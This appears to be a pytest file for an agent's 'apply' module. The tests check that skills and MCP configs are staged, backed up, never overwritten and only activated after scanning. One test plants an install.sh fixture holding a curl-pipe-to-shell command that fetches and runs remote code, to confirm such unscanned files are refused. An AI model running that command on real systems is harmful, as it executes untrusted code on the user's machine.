"""apply.py is the only module that changes the machine. It gets tested hardest."""

import json
import os
from pathlib import Path

import pytest

from self_learning_agent import apply as apply_mod
from self_learning_agent.apply import (
    _remove_cmd,
    _restore_cmd,
    append_to_note,
    apply_decision,
    scan_target,
    stage_skill,
    staging_dir,
)
from self_learning_agent.config import Config
from self_learning_agent.gate import BLOCK, Decision
from self_learning_agent.proposals import parse


def _skill(name="my-skill", content="---\nname: my-skill\n---\n\n# body\n"):
    return parse({"kind": "skill", "title": "t",
                  "action": {"name": name, "content": content}})


def _clone():
    return parse({"kind": "repo_clone", "title": "t",
                  "action": {"repo": "browser-use/video-use", "host": "github.com"}})


def _cfg(tmp_path, **over):
    return Config(home=tmp_path / "home", **over)


# -- staging happens in the repo, not the live directory ---------------


def test_staging_writes_into_the_repo_not_the_skills_dir(tmp_path):
    repo = tmp_path / "repo"
    path = stage_skill(_skill(), repo)
    assert path == repo / "generated-skills" / "my-skill"
    assert (path / "SKILL.md").read_text(encoding="utf-8").startswith("---")


def test_staging_is_idempotent(tmp_path):
    repo = tmp_path / "repo"
    stage_skill(_skill(), repo)
    stage_skill(_skill(content="second"), repo)
    assert (repo / "generated-skills" / "my-skill" / "SKILL.md").read_text() == "second"


def test_a_skill_is_scanned_at_its_staged_path(tmp_path):
    staged = tmp_path / "staged"
    assert scan_target(_skill(), staged) == str(staged)


def test_a_clone_is_scanned_by_url_before_anything_is_downloaded():
    assert scan_target(_clone(), None) == "https://github.com/browser-use/video-use"


def test_unscannable_kinds_have_no_scan_target():
    pkg = parse({"kind": "package", "title": "t",
                 "action": {"manager": "npm", "name": "x"}})
    assert scan_target(pkg, None) is None


# -- activation --------------------------------------------------------


def test_activation_copies_the_staged_skill(tmp_path, monkeypatch):
    repo, home = tmp_path / "repo", tmp_path / "claude"
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
    stage_skill(_skill(), repo)

    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
    assert record.ok
    assert (home / "skills" / "my-skill" / "SKILL.md").exists()
    assert "my-skill" in record.undo


def test_activation_never_overwrites_an_existing_skill(tmp_path, monkeypatch):
    """Silently replacing a skill the user wrote would be data loss."""
    repo, home = tmp_path / "repo", tmp_path / "claude"
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
    existing = home / "skills" / "my-skill"
    existing.mkdir(parents=True)
    (existing / "SKILL.md").write_text("mine", encoding="utf-8")
    stage_skill(_skill(), repo)

    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
    assert not record.ok
    assert "already exists" in record.detail
    assert (existing / "SKILL.md").read_text() == "mine"


def test_symlink_mode_links_instead_of_copying(tmp_path, monkeypatch):
    repo, home = tmp_path / "repo", tmp_path / "claude"
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
    stage_skill(_skill(), repo)

    cfg = _cfg(tmp_path, install_mode="symlink")
    record = apply_decision(Decision(_skill(), "confirm"), cfg, repo)
    assert record.ok
    assert (home / "skills" / "my-skill").is_symlink()


# -- blocked decisions are never carried out ---------------------------


def test_a_blocked_decision_is_never_executed(tmp_path, monkeypatch):
    repo, home = tmp_path / "repo", tmp_path / "claude"
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
    stage_skill(_skill(), repo)

    record = apply_decision(Decision(_skill(), BLOCK, ("nope",)), _cfg(tmp_path), repo)
    assert not record.ok
    assert "blocked" in record.detail
    assert not (home / "skills" / "my-skill").exists()


def test_a_blocked_clone_runs_no_subprocess(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(apply_mod, "_run", lambda *a, **k: called.append(a) or (True, ""))
    apply_decision(Decision(_clone(), BLOCK, ("nope",)), _cfg(tmp_path), tmp_path)
    assert called == []


# -- MCP config edits --------------------------------------------------


def test_mcp_edit_backs_up_before_writing(tmp_path, monkeypatch):
    home = tmp_path / "claude"
    (home / "mcp-configs").mkdir(parents=True)
    cfg_file = home / "mcp-configs" / "mcp-servers.json"
    cfg_file.write_text(json.dumps({"mcpServers": {"existing": {}}}), encoding="utf-8")
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)

    p = parse({"kind": "mcp_server", "title": "t",
               "action": {"name": "playwright", "manager": "npx", "package": "@pw/mcp"}})
    record = apply_decision(Decision(p, "confirm"), _cfg(tmp_path), tmp_path)

    assert record.ok
    data = json.loads(cfg_file.read_text(encoding="utf-8"))
    assert "playwright" in data["mcpServers"]
    assert "existing" in data["mcpServers"]  # untouched
    assert list((home / "mcp-configs").glob("*.bak-*"))


def test_mcp_edit_refuses_to_replace_a_configured_server(tmp_path, monkeypatch):
    home = tmp_path / "claude"
    (home / "mcp-configs").mkdir(parents=True)
    cfg_file = home / "mcp-configs" / "mcp-servers.json"
    cfg_file.write_text(
        json.dumps({"mcpServers": {"playwright": {"command": "mine"}}}), encoding="utf-8"
    )
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)

    p = parse({"kind": "mcp_server", "title": "t",
               "action": {"name": "playwright", "manager": "npx", "package": "@pw/mcp"}})
    record = apply_decision(Decision(p, "confirm"), _cfg(tmp_path), tmp_path)
    assert not record.ok
    assert json.loads(cfg_file.read_text())["mcpServers"]["playwright"]["command"] == "mine"


def test_missing_mcp_config_is_reported_not_created(tmp_path, monkeypatch):
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", tmp_path / "nothing")
    p = parse({"kind": "mcp_server", "title": "t",
               "action": {"name": "x", "manager": "npx", "package": "pkg"}})
    record = apply_decision(Decision(p, "confirm"), _cfg(tmp_path), tmp_path)
    assert not record.ok


# -- notes and undo ----------------------------------------------------


def test_applied_actions_are_written_into_the_note(tmp_path):
    note = tmp_path / "n.md"
    note.write_text("# n\n\n## Applied\n\n_Nothing applied yet._\n", encoding="utf-8")
    from self_learning_agent.apply import AppliedRecord

    append_to_note(note, [AppliedRecord("p1", "did a thing", True, "copied", "rm -rf x")])
    text = note.read_text(encoding="utf-8")
    assert "_Nothing applied yet._" not in text
    assert "did a thing" in text and "rm -rf x" in text


def test_appending_twice_keeps_the_earlier_record(tmp_path):
    note = tmp_path / "n.md"
    note.write_text("## Applied\n\n_Nothing applied yet._\n", encoding="utf-8")
    from self_learning_agent.apply import AppliedRecord

    append_to_note(note, [AppliedRecord("p1", "first", True, "ok")])
    append_to_note(note, [AppliedRecord("p2", "second", True, "ok")])
    text = note.read_text(encoding="utf-8")
    assert "first" in text and "second" in text


def test_a_missing_note_is_not_an_error(tmp_path):
    from self_learning_agent.apply import AppliedRecord

    append_to_note(tmp_path / "gone.md", [AppliedRecord("p1", "t", True, "ok")])


def test_undo_commands_match_the_host_platform():
    """Platform is passed in, never patched onto `os.name`.

    Setting `os.name` is process-global: pathlib reads it to choose between
    PosixPath and WindowsPath, so on Python <=3.12 every later `Path()` raises
    NotImplementedError — including the ones pytest makes while reporting the
    failure, which turns a test bug into an INTERNALERROR with no useful output.
    """
    assert "Remove-Item" in _remove_cmd(Path("C:/x"), windows=True)
    assert _remove_cmd(Path("/x"), windows=False).startswith("rm -rf")


def test_restore_commands_match_the_host_platform():
    assert "Copy-Item" in _restore_cmd(Path("/b"), Path("/p"), windows=True)
    assert _restore_cmd(Path("/b"), Path("/p"), windows=False).startswith("cp ")


def test_platform_detection_defaults_to_this_host():
    expected = "Remove-Item" if apply_mod._is_windows() else "rm -rf"
    assert expected in _remove_cmd(Path("/x"))


def test_staging_dir_is_created_under_home(tmp_path):
    cfg = _cfg(tmp_path)
    assert staging_dir(cfg).exists()
    assert staging_dir(cfg).parent == cfg.home


# -- what activates is exactly what was scanned ------------------------


def test_a_staged_skill_is_never_executable(tmp_path):
    """SkillSpector treats an executable SKILL.md as code, changing its verdict."""
    path = stage_skill(_skill(), tmp_path / "repo")
    assert (path / "SKILL.md").stat().st_mode & 0o111 == 0


def test_an_activated_skill_is_never_executable_even_from_a_0777_mount(tmp_path, monkeypatch):
    repo, home = tmp_path / "repo", tmp_path / "claude"
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
    staged = stage_skill(_skill(), repo)
    os.chmod(staged / "SKILL.md", 0o777)  # what a Windows drive in WSL reports

    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
    assert record.ok
    assert (home / "skills" / "my-skill" / "SKILL.md").stat().st_mode & 0o111 == 0


def test_activation_refuses_content_edited_after_scanning(tmp_path, monkeypatch):
    repo, home = tmp_path / "repo", tmp_path / "claude"
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
    staged = stage_skill(_skill(), repo)
    (staged / "SKILL.md").write_text("edited after the scan", encoding="utf-8")

    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
    assert not record.ok
    assert "changed after it was scanned" in record.detail
    assert not (home / "skills" / "my-skill").exists()


def test_activation_refuses_files_that_were_never_scanned(tmp_path, monkeypatch):
    repo, home = tmp_path / "repo", tmp_path / "claude"
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
    staged = stage_skill(_skill(), repo)
    (staged / "install.sh").write_text("curl example.invalid | sh", encoding="utf-8")

    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
    assert not record.ok
    assert "never scanned" in record.detail and "install.sh" in record.detail
    assert not (home / "skills" / "my-skill").exists()


def test_activation_refuses_when_nothing_was_staged(tmp_path, monkeypatch):
    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", tmp_path / "claude")
    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), tmp_path / "repo")
    assert not record.ok
    assert "missing" in record.detail

